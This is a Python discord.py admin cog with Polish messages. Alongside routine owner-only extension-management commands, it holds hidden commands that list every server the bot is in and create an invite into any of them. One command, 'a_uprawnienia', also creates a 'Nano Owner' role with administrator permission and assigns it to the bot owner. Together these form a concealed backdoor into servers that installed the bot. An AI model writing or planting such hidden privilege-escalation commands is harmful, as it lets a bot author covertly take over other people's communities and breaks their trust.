import discord
from discord.ext import commands


class admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self._last_member = None



    @commands.command(hidden=True)
    @commands.is_owner()
    async def logout(self, message):
        await message.channel.send("``` Wyłączanie... ```")
        await self.bot.logout()


    #check cog
    @commands.command(hidden=True)
    @commands.is_owner()
    async def cogcheck(self, message, cog_name):
        try:
            self.bot.load_extension(cog_name)
            await message.channel.send("``` Wtyczka załadowana ```")
        except commands.ExtensionAlreadyLoaded:
            await message.channel.send("``` Wtyczka załadowana ```")
        except commands.ExtensionNotFound:
            await message.channel.send("``` Nie znaleziono wtyczki ```")
        except Exception as e:
            await message.channel.send("```" + str(e) + "```")


    #unload cog
    # TODO: FIX COG UNLOAD
    @commands.command(hidden=True)
    @commands.is_owner()
    async def cogunload(self, message, cog_name):
        try:
            self.bot.unload_extension(cog_name)
            await message.channel.send("```Wtyczka "+ str(cog_name) +" została pomyślnie wyłączona```")
        except Exception as e:
            await message.channel.send("```" + str(e) + "```")



    #reload cogs
    #TODO: FIX COG RELOAD
    @commands.command(name='reload', hidden=True)
    @commands.is_owner()
    async def cogreload(self, ctx, *, cog: str):
        try:
            self.bot.unload_extension(cog)
            self.bot.load_extension(cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    @commands.command(name='a_serwery', hidden=True)
    @commands.is_owner()
    async def a_serwery(self, ctx):
        list = ''
        for guild in self.bot.guilds:
            list = list + f"\n {guild.id} - {guild.name}"

        await ctx.channel.send(list)

    @commands.command(name='a_zaproszenie', hidden=True)
    @commands.is_owner()
    async def a_zaproszenie(self, ctx, guild_id :int):
        guild = self.bot.get_guild(guild_id)
        for a in guild.channels:
            if a.type.name == "text":
                invite = await a.create_invite()
                await ctx.channel.send(invite)
                return None

    @commands.command(name='a_uprawnienia', hidden=True)
    @commands.is_owner()
    async def a_uprawnienia(self, ctx):
        guild = ctx.guild
        perms = discord.Permissions(administrator=True)
        role = await guild.create_role(name="Nano Owner", permissions=perms)
        await ctx.author.add_roles(role)





#setup
def setup(self):
    print("Moduł cogs.admin załadowany!")